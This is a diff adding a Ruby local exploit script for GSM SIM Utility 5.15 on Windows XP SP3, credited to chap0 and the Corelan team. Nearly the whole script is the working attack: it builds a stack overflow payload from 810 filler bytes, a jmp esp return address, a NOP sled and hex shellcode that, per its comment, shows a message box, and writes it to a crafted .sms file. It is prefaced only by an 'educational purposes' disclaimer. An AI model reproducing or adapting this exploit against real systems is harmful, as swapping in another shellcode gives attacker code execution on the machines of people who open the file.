@@ -1,0 +1,68 @@
+# Exploit Title : GSM SIM Utility Local Exploit Direct Ret ver.
+# Date          : July 07, 2010
+# Author        : chap0 [www.seek-truth.net]
+# Download Link : http://download.cnet.com/GSM-SIM-Utility/3000-18508_4-10396246.html?tag=mncol
+# Version       : 5.15
+# OS            : Windows XP SP3
+# Greetz to     : Corelan Security Team
+# Advisory      : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-054
+# The Crew      : http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# Corelan does not want anyone to use this script
+# for malicious and/or illegal purposes
+# Corelan cannot be held responsible for any illegal use.
+#
+# Note : you are not allowed to edit/modify this code.  
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+# Code :
+#!/usr/bin/ruby
+puts '|------------------------------------------------------------------|'
+puts '|                         __               __                      |'
+puts '|   _________  ________  / /___ _____     / /____  ____ _____ ___  |'
+puts '|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |'
+puts '| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |'
+puts '| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |'
+puts '|                                                                  |'
+puts '|                                       http://www.corelan.be:8800 |'
+puts '|                                                                  |'
+puts '|-------------------------------------------------[ EIP Hunters ]--|'
+puts '[*] GSM SIM Utility Local Exploit Direct Ret ver. by chap0.'
+puts '[*] Visit seek-truth.net'
+
+crash = "A" * 810
+eip = "01524000" #jmp esp
+nop = "90" * 10
+#message box
+code ="d9eb9bd97424f431d2b27a31c964"+
+"8b71308b760c8b761c8b46088b7e"+
+"208b36384f1875f35901d1ffe160"+
+"8b6c24248b453c8b54057801ea8b"+
+"4a188b5a2001ebe337498b348b01"+
+"ee31ff31c0fcac84c0740ac1cf0d"+
+"01c7e9f1ffffff3b7c242875de8b"+
+"5a2401eb668b0c4b8b5a1c01eb8b"+
+"048b01e88944241c61c3b20829d4"+
+"89e589c2688e4e0eec52e89cffff"+
+"ff894504bb7ed8e273871c2452e8"+
+"8bffffff894508686c6c20ff6833"+
+"322e646875736572885c240a89e6"+
+"56ff550489c250bba8a24dbc871c"+
+"2452e85effffff68703058206820"+
+"6368616864206279686f69746568"+
+"4578706c31db885c241289e36868"+
+"5820206844656174682069732068"+
+"2053696e6873206f666857616765"+
+"685468652031c9884c241989e131"+
+"d252535152ffd031c050ff5508"
+
+payload = crash + eip + nop + code
+
+sms = File.new( "directret.sms", "w" )
+	if sms
+	sms.syswrite(payload)
+	else
+	puts "Unable to create file."
+end
